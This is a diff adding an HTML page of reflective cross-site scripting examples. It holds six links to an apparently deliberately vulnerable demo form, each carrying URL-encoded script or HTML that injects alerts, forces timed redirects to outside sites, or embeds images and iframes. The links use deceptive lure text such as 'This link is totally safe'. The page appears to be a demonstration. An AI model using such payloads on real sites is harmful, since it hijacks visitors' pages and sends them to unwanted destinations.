@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Reflective XSS (Cross-site Scripting) Examples</title>
+</head>
+<body style="font-family: sans-serif;margin: auto;margin-left: 25%;padding: 25px;">
+  <h3>Reflective XSS (Cross-site Scripting) Examples</h3>
+  <ul>
+    <li style="margin-bottom: 12px;">
+      <a href="https://webio.me/buggyform/buggy-form.php?sometext=%3Cscript%3Ealert%28%27Check+this+out%21%27%29%3C%2Fscript%3E%3Cscript%3Ealert+%3D+function()+{}%3B%3C%2Fscript%3E&SORT=D" target="_blank">Check this out!</a>
+    </li>
+    <li style="margin-bottom: 12px;">
+      <a href="https://webio.me/buggyform/buggy-form.php?sometext=%3Cscript%3Ealert%28%27Join+our+mailing+list%21+e-mail+joe%40sketchyemail.com%27%29%3C%2Fscript%3E%3Cscript%3Ealert+%3D+function()+{}%3B%3C%2Fscript%3E&SORT=D" target="_blank">Our mailing list</a>
+    </li>
+    <li style="margin-bottom: 12px;">
+      <a href="https://webio.me/buggyform/buggy-form.php?sometext=%3Cscript%3Ealert+%3D+function()+{}%3B%3C%2Fscript%3E%3Cscript%3Efunction+Redirect%28%29+%7B+window.location%3D%27http%3A%2F%2Fgeektyper.com%2Fanon%2F%27%3B+%7D+setTimeout%28%27Redirect%28%29%27%2C+3000%29%3B%3C%2Fscript%3E" target="_blank">This link is totally safe</a>
+    </li>
+    <li style="margin-bottom: 12px;">
+      <a href="https://webio.me/buggyform/buggy-form.php?sometext=%3Cscript%3Efunction+Redirect%28%29+%7B+window.location%3D%27https%3A%2F%2Fwww.youtube.com%2Fchannel%2FUCCjBdg3-oRpyThG7sOAzuiw%27%3B+%7D+document.write%28%27%3Cstrong%3EYou+will+be+redirected+to+my+awesome+website+in+6+seconds...%3C%2Fstrong%3E%27%29%3B+setTimeout%28%27Redirect%28%29%27%2C+6000%29%3B%3C%2Fscript%3E" target="_blank">Click here for cool stuff</a>
+    </li>
+    <li style="margin-bottom: 12px;">
+      <a href="https://webio.me/buggyform/buggy-form.php?sometext=%3Ca+href%3D%27https%3A%2F%2Fwww.myinstants.com%2Fmedia%2Fsounds%2Fthat_was_easy.mp3%27%3E%3Cimg+src%3D%27https%3A%2F%2Fs14.postimg.org%2Fngygz3e5t%2Feasy_button.gif%27+style%3D%27height%3A+180px%27%3E%3C%2Fa%3E" target="_blank">Too easy?</a>
+    </li>
+    <li style="margin-bottom: 12px;">
+      <a href="https://webio.me/buggyform/buggy-form.php?sometext=%3Ciframe+width%3D%27520%27+height%3D%27270%27+src%3D%27https%3A%2F%2Fwww.youtube.com%2Fembed%2FJ---aiyznGQ%27+frameborder%3D%270%27+allow%3D%27autoplay%3B+encrypted-media%27+allowfullscreen%3E%3C%2Fiframe%3E" target="_blank">A fine performance</a>
+    </li>
+  </ul>
+</body>
+</html>
